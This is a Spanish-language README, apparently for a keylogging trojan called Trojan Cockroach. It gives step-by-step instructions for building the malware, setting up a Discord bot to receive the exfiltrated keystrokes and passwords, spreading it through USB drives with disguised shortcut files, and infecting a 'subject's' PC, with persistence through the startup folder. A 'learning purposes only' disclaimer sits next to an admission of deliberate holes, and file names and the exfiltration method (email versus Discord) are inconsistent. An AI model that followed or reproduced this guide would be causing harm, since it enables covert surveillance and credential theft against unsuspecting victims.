

#### Un spyware troyano sigiloso

Está viendo un **Virus troyano** que roba datos (ID, contraseña, cada pulsación de tecla) de la PC (Windows XP o posterior) y luego se los devuelve por correo electrónico. Se propaga entre las PC a través de unidades USB y es casi indetectable para cualquier software antivirus.

*Creado solo con fines de aprendizaje.*

### Intro
- [Runtime-win.cpp] registra los datos del usuario, envía datos a través de Transmit.exe, infecta la unidad portátil.
- [MS-19.cpp] instala el virus en la computadora desde la unidad portátil.
- [Transmit.exe] envía datos por correo electrónico.
- [Runtime-win.lnk] reside en la carpeta de inicio de la PC y activa Runtime-win.exe.
- [MS-19.lnk] toma diferentes nombres atractivos en la unidad portátil infectada, activa Infect.exe cuando se hace clic.
- [DecodeMessage.cpp] used to decode received email.

### Setup

Preparation

  #1 Descarga el repositorio completo.

  #2 crea tu bot en discord: Para crear un bot de Discord y obtener los permisos necesarios para enviar mensajes, debes seguir los siguientes pasos:
 - Ve a la página de desarrolladores de Discord y accede a tu cuenta o crea una nueva si aún no tienes una.
 - Haz clic en el botón "New Application" para crear una nueva aplicación.
 - Asigna un nombre a tu aplicación y haz clic en "Create".
 - En la pestaña "Bot", haz clic en "Add Bot" y confirma tu selección.
 - A continuación, podrás configurar los permisos de tu bot en la pestaña "OAuth2".
 - En la sección "Scopes", selecciona "bot" y, a continuación, selecciona los permisos que quieras otorgarle al bot en la sección "Bot Permissions".
 - Una vez que hayas seleccionado los permisos que deseas, copia el enlace generado en la sección "Scopes" y úsalo para invitar al bot a tu servidor de Discord.
Una vez que hayas seguido estos pasos, tu bot estará listo para enviar mensajes en tu servidor de Discord.
  - crear un servidor de discord, invitar el bot al servidor discord, primero abrir el enlace generado por el bot para darle autorizacion.


  #3 Cambie el método sendData() de TrojanCockroach.cpp: su token del bot de discord y tu id del servidor.
  
  #4 Compile TrojanCockroach.cpp & Infect.cpp. Transmit.exe es en realidad la distribución ejecutable de curl para Windows.

  #5 Coloque TrojanCockroach.exe, Infect.exe, Transmit.exe, Infect.lnk y TrojanCockroach. lnk en la misma carpeta.
  
  #6 Ahora ejecuta TrojanCockroach.exe y luego inserta un pendrive (¡mira la magia!). Obtendrá una carpeta oculta y un archivo de enlace en su pendrive. La carpeta oculta contiene el paquete completo, y el archivo de enlace en realidad se renombró como Infect.lnk.
  
Attack

  Inserte la unidad USB en la PC del sujeto (¡Sí, debe iniciar el proceso de difusión desde algún lugar!). Ejecute Infect.lnk y se inyectará el spyware.

  El syware se activará después de reiniciar. Ahora (después de un reinicio) cada vez que se inserte una unidad USB en la PC afectada, el virus se copiará a sí mismo en ella y el ciclo comenzará de nuevo.

Data Collection

  Debe esperar varios días (dependiendo de la cantidad de encendidos/apagados de la PC) antes de obtener cualquier dato.
  
  Después de recibir el correo electrónico, copie el mensaje completo en un archivo de texto. 
  
  A medida que el mensaje llega a través del correo electrónico, se convierten ciertos caracteres. Para resolver eso --- --- ---.

  Ahora, ejecute DecodeMessage.exe para decodificar el mensaje como texto sin formato.
  
  En esta fase, puede buscar patrones específicos en el texto y, por lo tanto, deshacerse de la mayoría de las partes inútiles (como hacer clic con el mouse o presionar el mismo grupo de teclas que sucede durante el juego).


### Further 
You may read [TrojanCockroachStory] to get an overview of how the program works. You will get a clearer understanding of the project from its pre-project- **[StupidKeyLogger]**.

El proyecto es perfectamente ejecutable. Sin embargo, no quiero que los novatos abusen de mi proyecto. Entonces, estoy **manteniendo algunos secretos simples sin revelar**. También hay algunos **agujeros creados intencionalmente en este 'README'**. También he hecho algunos **cambios sin sentido en el código**; para que nadie pueda ejecutarlo de manera efectiva sin ensuciarse las manos. Creo que estos simples obstáculos pueden ser superados fácilmente por *** PROGRAMADORES REALES *** 

**Nota:** *No asumiré ninguna responsabilidad por el mal acto de otra persona con este programa.* Pero sí creo que un estudiante real aprenderá mucho de esto.


### License
Trojan Cockroach is licensed under < rel="license" href="https://opensource.org/licenses/MIT">MIT License
